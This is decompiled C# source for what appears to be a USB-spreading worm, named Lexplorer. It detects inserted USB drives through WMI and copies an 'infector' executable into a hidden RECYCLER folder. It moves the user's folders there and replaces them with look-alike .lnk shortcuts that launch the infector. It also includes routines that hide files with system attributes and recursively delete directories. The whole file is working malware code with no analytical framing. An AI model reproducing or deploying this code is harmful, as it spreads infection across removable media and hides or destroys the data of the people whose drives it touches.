using System;
using System.Collections.Generic;
using System.IO;
using System.Management;
using System.Threading;
using Shell32;

namespace Lexplorer;

internal class Class12
{
	private const string DESTINATION_FOLDER_NAME = "RECYCLER";

	private static ManagementEventWatcher w;

	public string InfectorFilePath { get; private set; }

	public string InfectorFileName { get; private set; }

	public event EventArrivedEventHandler OnUSBInserted
	{
		add
		{
			//IL_0010: Unknown result type (might be due to invalid IL or missing references)
			//IL_0016: Expected O, but got Unknown
			EventArrivedEventHandler val = this.OnUSBInserted;
			EventArrivedEventHandler val2;
			do
			{
				val2 = val;
				EventArrivedEventHandler value2 = (EventArrivedEventHandler)Delegate.Combine((Delegate?)(object)val2, (Delegate?)(object)value);
				val = Interlocked.CompareExchange(ref this.OnUSBInserted, value2, val2);
			}
			while (val != val2);
		}
		remove
		{
			//IL_0010: Unknown result type (might be due to invalid IL or missing references)
			//IL_0016: Expected O, but got Unknown
			EventArrivedEventHandler val = this.OnUSBInserted;
			EventArrivedEventHandler val2;
			do
			{
				val2 = val;
				EventArrivedEventHandler value2 = (EventArrivedEventHandler)Delegate.Remove((Delegate?)(object)val2, (Delegate?)(object)value);
				val = Interlocked.CompareExchange(ref this.OnUSBInserted, value2, val2);
			}
			while (val != val2);
		}
	}

	public Class12(string infectorFilePath)
	{
		InfectorFilePath = infectorFilePath;
		string text2 = (InfectorFileName = infectorFilePath.Substring(infectorFilePath.LastIndexOf("\\") + 1));
	}

	public bool IsContamined(DriveInfo removableDrive)
	{
		string text = Path.Combine(removableDrive.ToString(), "RECYCLER");
		if (!Directory.Exists(text))
		{
			return false;
		}
		text = Path.Combine(text, InfectorFileName);
		if (!File.Exists(text))
		{
			return false;
		}
		return true;
	}

	public void Contamine(DriveInfo removableDrive)
	{
		try
		{
			string text = Path.Combine(removableDrive.RootDirectory.ToString(), "RECYCLER");
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			DirectoryInfo directoryInfo = new DirectoryInfo(text);
			directoryInfo.Attributes = FileAttributes.Directory | FileAttributes.Normal;
			File.Copy(InfectorFilePath, Path.Combine(text, InfectorFileName));
			FileInfo fileInfo = new FileInfo(text);
			fileInfo.Attributes = FileAttributes.Hidden | FileAttributes.System;
		}
		catch (Exception ex)
		{
			Console.WriteLine(" section: Contamination failed: {0}", ex.Message);
		}
	}

	public void Heal(DriveInfo removableDrive)
	{
		string text = Path.Combine(removableDrive.RootDirectory.ToString(), "RECYCLER");
		string path = Path.Combine(text, InfectorFileName);
		string path2 = removableDrive.RootDirectory.ToString();
		if (!Directory.Exists(text))
		{
			return;
		}
		DirectoryInfo directoryInfo = new DirectoryInfo(text);
		DirectoryInfo[] directories = directoryInfo.GetDirectories();
		DirectoryInfo[] array = directories;
		foreach (DirectoryInfo directoryInfo2 in array)
		{
			try
			{
				directoryInfo2.MoveTo(Path.Combine(path2, directoryInfo2.Name));
				string path3 = directoryInfo2.ToString() + ".lnk";
				if (File.Exists(path3))
				{
					File.Delete(path3);
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine(" section: Healing failed: {0}", ex.Message);
			}
		}
		try
		{
			if (File.Exists(path))
			{
				File.Delete(path);
			}
		}
		catch (Exception ex2)
		{
			Console.WriteLine(" section: Healing failed: {0}", ex2.Message);
		}
	}

	public void HideFolders(DriveInfo removableDrive)
	{
		try
		{
			string path = Path.Combine(removableDrive.RootDirectory.ToString(), "RECYCLER");
			DirectoryInfo rootDirectory = removableDrive.RootDirectory;
			rootDirectory.GetFiles();
			DirectoryInfo[] directories = rootDirectory.GetDirectories();
			if (directories.Length == 0)
			{
				return;
			}
			if (!Directory.Exists(path))
			{
				Directory.CreateDirectory(path);
			}
			DirectoryInfo directoryInfo = new DirectoryInfo(path);
			directoryInfo.Attributes = FileAttributes.Hidden | FileAttributes.System;
			string infectorFileName = InfectorFileName;
			string path2 = Path.Combine(rootDirectory.ToString(), "RECYCLER");
			path2 = Path.Combine(path2, infectorFileName);
			DirectoryInfo[] array = directories;
			string path3;
			foreach (DirectoryInfo directoryInfo2 in array)
			{
				if (!(directoryInfo2.Name == "RECYCLER"))
				{
					string sourceDirName = Path.Combine(rootDirectory.ToString(), directoryInfo2.Name);
					path3 = Path.Combine(rootDirectory.ToString(), "RECYCLER");
					path3 = Path.Combine(path3, directoryInfo2.Name);
					if (!Directory.Exists(path3))
					{
						Directory.Move(sourceDirName, path3);
						CreateShortcut(directoryInfo2.Name, path2, rootDirectory.ToString(), path3);
					}
				}
			}
			path3 = Path.Combine(rootDirectory.ToString(), "RECYCLER");
			path3 = Path.Combine(path3, infectorFileName);
			if (!File.Exists(path3))
			{
				File.Copy(InfectorFilePath, path3);
				FileInfo fileInfo = new FileInfo(path3);
				fileInfo.Attributes = FileAttributes.Hidden | FileAttributes.System;
			}
			directoryInfo.Attributes = FileAttributes.Hidden | FileAttributes.System;
		}
		catch (Exception ex)
		{
			Console.WriteLine(" section: HideFolders failed: {0}", ex.Message);
		}
	}

	public void Prettify(DriveInfo removableDrive)
	{
		try
		{
			if (removableDrive.DriveType != DriveType.Removable)
			{
				return;
			}
			DirectoryInfo directoryInfo = new DirectoryInfo(removableDrive.ToString());
			removableDrive.ToString();
			string text = Path.Combine(removableDrive.ToString(), "RECYCLER");
			directoryInfo.GetDirectories();
			Path.Combine(text, InfectorFileName);
			FileInfo[] files = directoryInfo.GetFiles("*.lnk");
			DirectoryInfo[] directories = new DirectoryInfo(text).GetDirectories();
			if (files.Length == directories.Length)
			{
				return;
			}
			List<string> list = new List<string>();
			FileInfo[] array = files;
			foreach (FileInfo fileInfo in array)
			{
				string shortcutArguments = GetShortcutArguments(fileInfo.FullName);
				if (shortcutArguments != null)
				{
					list.Add(shortcutArguments);
				}
			}
			for (int j = 0; j < directories.Length; j++)
			{
				if (!list.Contains(directories[j].FullName))
				{
					Directory.Delete(directories[j].FullName, recursive: true);
				}
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(" section: Prettifying failed: {0}", ex.Message);
		}
	}

	private void CreateShortcut(string shortcutName, string sourcePath, string shortcutAddress, string args)
	{
		string text = Path.Combine(shortcutAddress, shortcutName + ".lnk");
		File.WriteAllBytes(text, new byte[0]);
		Shell shell = (Shell)Activator.CreateInstance(Type.GetTypeFromCLSID(new Guid("13709620-C279-11CE-A49E-444553540000")));
		Folder folder = shell.NameSpace(shortcutAddress);
		FolderItem folderItem = folder.Items().Item(shortcutName + ".lnk");
		ShellLinkObject shellLinkObject = (ShellLinkObject)(dynamic)folderItem.GetLink;
		shellLinkObject.Path = sourcePath;
		shellLinkObject.Arguments = "\"" + args + "\"";
		shellLinkObject.WorkingDirectory = shortcutAddress;
		shellLinkObject.Save(text);
	}

	private string GetShortcutArguments(string shortcutPath)
	{
		try
		{
			string vDir = shortcutPath.Substring(0, shortcutPath.LastIndexOf("\\") + 1);
			string index = shortcutPath.Substring(shortcutPath.LastIndexOf("\\") + 1);
			Shell shell = (Shell)Activator.CreateInstance(Type.GetTypeFromCLSID(new Guid("13709620-C279-11CE-A49E-444553540000")));
			Folder folder = shell.NameSpace(vDir);
			FolderItem folderItem = folder.Items().Item(index);
			ShellLinkObject shellLinkObject = (ShellLinkObject)(dynamic)folderItem.GetLink;
			return shellLinkObject.Arguments.Replace("\"", "");
		}
		catch (Exception ex)
		{
			Console.WriteLine("GetShortcutArguments {0}", ex.Message);
			return null;
		}
	}

	public void AddInsertUSBHandler()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_001d: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		ManagementScope val = new ManagementScope("root\\CIMV2");
		val.get_Options().set_EnablePrivileges(true);
		try
		{
			WqlEventQuery val2 = new WqlEventQuery();
			val2.set_EventClassName("__InstanceCreationEvent");
			val2.set_WithinInterval(new TimeSpan(0, 0, 3));
			val2.set_Condition("TargetInstance ISA 'Win32_USBControllerdevice'");
			w = new ManagementEventWatcher(val, (EventQuery)(object)val2);
			w.add_EventArrived(this.OnUSBInserted);
			w.Start();
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
			if (w != null)
			{
				w.Stop();
			}
		}
	}
}
